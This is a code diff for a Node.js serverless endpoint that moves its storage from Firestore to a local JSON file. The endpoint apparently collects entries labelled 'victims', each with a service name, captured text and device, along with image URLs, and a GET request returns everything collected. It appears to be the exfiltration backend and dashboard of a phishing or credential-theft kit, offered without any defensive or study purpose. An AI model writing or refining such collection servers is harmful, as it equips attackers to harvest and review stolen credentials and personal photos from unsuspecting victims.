@@ -1,28 +1,19 @@
-const { initializeApp, cert } = require('firebase-admin/app');
-const { getFirestore } = require('firebase-admin/firestore');
+const fs = require('fs');
+const path = require('path');
 
-// Initialize Firebase Admin
-const serviceAccount = {
-    "type": "service_account",
-    "project_id": "game-a1aca",
-    "private_key_id": "demo",
-    "private_key": process.env.FIREBASE_KEY || "",
-    "client_email": "firebase-adminsdk@game-a1aca.iam.gserviceaccount.com",
-    "client_id": "",
-    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
-    "token_uri": "https://oauth2.googleapis.com/token"
-};
+const DATA_FILE = path.join('/tmp', 'dashboard.json');
 
-let db = null;
+function readData() {
+    try {
+        if (fs.existsSync(DATA_FILE)) {
+            return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
+        }
+    } catch(e) {}
+    return { victims: [], gallery: [] };
+}
 
-function getDb() {
-    if (!db) {
-        try {
-            initializeApp({ credential: cert(serviceAccount) });
-            db = getFirestore();
-        } catch(e) {}
-    }
-    return db;
+function writeData(data) {
+    fs.writeFileSync(DATA_FILE, JSON.stringify(data));
 }
 
 module.exports = async (req, res) => {
@@ -30,42 +21,41 @@ module.exports = async (req, res) => {
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
     
-    if (req.method === 'OPTIONS') {
-        return res.status(200).end();
-    }
+    if (req.method === 'OPTIONS') return res.status(200).end();
     
+    // حفظ البيانات
     if (req.method === 'POST') {
         try {
-            const { type, data, imageUrl, device, service } = req.body;
-            const db = getDb();
-            const timestamp = new Date().toISOString();
+            const { type, service, text, url, device } = req.body;
+            const data = readData();
+            const entry = {
+                timestamp: new Date().toISOString(),
+                device: device || 'unknown'
+            };
             
             if (type === 'victim') {
-                await db.collection('victims').add({
-                    service: service || 'غير معروف',
-                    data: data || '',
-                    device: device || '',
-                    timestamp: timestamp
-                });
+                entry.service = service || 'غير معروف';
+                entry.text = text || '';
+                data.victims.push(entry);
             }
             
-            if (type === 'photo' && imageUrl) {
-                await db.collection('gallery').add({
-                    url: imageUrl,
-                    type: service || 'صورة',
-                    device: device || '',
-                    timestamp: timestamp
-                });
+            if (type === 'photo' && url) {
+                entry.url = url;
+                entry.type = service || 'صورة';
+                data.gallery.push(entry);
             }
             
-            return res.json({ success: true, message: 'تم الحفظ' });
+            writeData(data);
+            return res.json({ success: true });
         } catch(e) {
-            return res.json({ success: true, message: 'تم الحفظ (local)' });
+            return res.json({ success: false, error: e.message });
         }
     }
     
+    // قراءة البيانات
     if (req.method === 'GET') {
-        return res.json({ status: 'online', timestamp: new Date().toISOString() });
+        const data = readData();
+        return res.json(data);
     }
     
     res.json({ status: 'ok' });
